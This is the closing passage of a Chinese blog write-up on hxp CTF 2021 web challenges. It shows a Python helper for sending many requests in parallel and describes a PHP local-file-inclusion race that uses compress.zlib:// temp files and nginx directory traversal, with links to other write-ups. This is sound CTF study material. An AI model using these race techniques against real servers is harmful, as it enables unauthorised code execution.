<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">create_requests_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead</span>
    adapter <span class="token operator">=</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>pool_connections<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">,</span> pool_maxsize<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">)</span>
    session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> adapter<span class="token punctuation">)</span>
    <span class="token keyword">return</span> session
</code></pre>
<p>以及使用multiprocessing库和threading库，同时多开进程和线程，最大程度上往外狂发请求，使用multiprocessing库好像能在一定程度上减少python本身的GIL（全局解释器锁）虚假多线程的影响（印象里好像就是多线程其实也只有那个拿到GIL的线程能跑，每次只有一个线程在CPU上执行，顶多就是利用好IO切换的时间，能跑满一个CPU），开了这个多进程之后似乎是每个CPU上单独起一个python进程，各自有各自的GIL，反正就是能提高CPU利用率就是了，在多个CPU上各自进程的线程疯狂上下，而不是只在一个CPU上几个线程疯狂上下</p>
<p>还有之前hxpctf2019出的includer的题解，使用<code>compress.zlib://</code>这个协议产生临时文件（就和上传文件的产生临时文件类似），配合nginx错误配置的目录遍历获取临时文件名<br>这里面同时也使用了手写socket卡住PHP执行，利用PHP输出缓冲区大小限制，通过输出长度大于缓冲区强制PHP在http请求未结束时提前发送回显等操作，至于那个临时文件上传多少写入多少，先校验再继续传输写入包含，多多少少有点玄幻，可能需要高强度看源码，但都很值得学习<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer">https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer</a></p>
<p>不过说到底，PHP文件包含一般有一个裸包含，upload progress基本上就能打通了，生产环境也许还能再包含一下log之类的，感觉这种在极限限制下的奇技淫巧意义不一定大啊</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>出题人的官方题解<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">PHP LFI with Nginx Assistance</a><br>pasten的题解（说起来这个解就是预期解来着）<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/">Winning the Impossible Race – An Unintended Solution for Includer’s Revenge &#x2F; Counter (hxp 2021)</a><br>zedd师傅的分析<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/wp/" rel="tag"># wp</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/bytectf2021final%E5%A4%8D%E7%8E%B0.html" rel="prev" title="bytectf2021final复现">
      <i class="fa fa-chevron-left"></i> bytectf2021final复现
    </a></div>
      <div class="post-nav-item">
    <a href="/%5BRWCTF2021%5Dwp.html" rel="next" title="[RWCTF2021]wp">
      [RWCTF2021]wp <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hxpctf2021%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">hxpctf2021复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Log-4-sanity-check"><span class="nav-number">1.1.</span> <span class="nav-text">Log 4 sanity check</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%B6%E6%9E%81dockerfile"><span class="nav-number">1.1.1.</span> <span class="nav-text">究极dockerfile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.1.2.</span> <span class="nav-text">题解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shitty-blog"><span class="nav-number">1.2.</span> <span class="nav-text">shitty blog</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91"><span class="nav-number">1.2.1.</span> <span class="nav-text">坑</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unzipper"><span class="nav-number">1.3.</span> <span class="nav-text">unzipper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#counter"><span class="nav-number">1.4.</span> <span class="nav-text">counter</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E7%9A%84%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="nav-number">1.4.1.</span> <span class="nav-text">可能的思路？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#update"><span class="nav-number">1.4.2.</span> <span class="nav-text">update</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#includer%E2%80%99s-revenge"><span class="nav-number">1.5.</span> <span class="nav-text">includer’s revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#update-1"><span class="nav-number">1.5.1.</span> <span class="nav-text">update</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%BE%E7%82%B91"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">难点1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%BE%E7%82%B92"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">难点2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E7%BB%95%E8%BF%87%E8%BD%AF%E9%93%BE%E6%8E%A5%E6%96%B9%E6%A1%88"><span class="nav-number">1.5.1.2.1.</span> <span class="nav-text">官方绕过软链接方案</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%A6%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="nav-number">1.5.1.2.2.</span> <span class="nav-text">学一些其他的操作</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LFI%E7%9A%84%E6%9C%80%E7%BB%88%E9%80%9A%E6%9D%80"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">LFI的最终通杀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">其他的杂七杂八</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.6.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://thirdqq.qlogo.cn/g?b=sdk&k=LSKHut5Wmfic1emlMT4FpuA&kti=ZMCGFwAAAAI&s=640&t=1673848139">
  <p class="site-author-name" itemprop="name">Z3ratu1</p>
  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">190</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">94</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
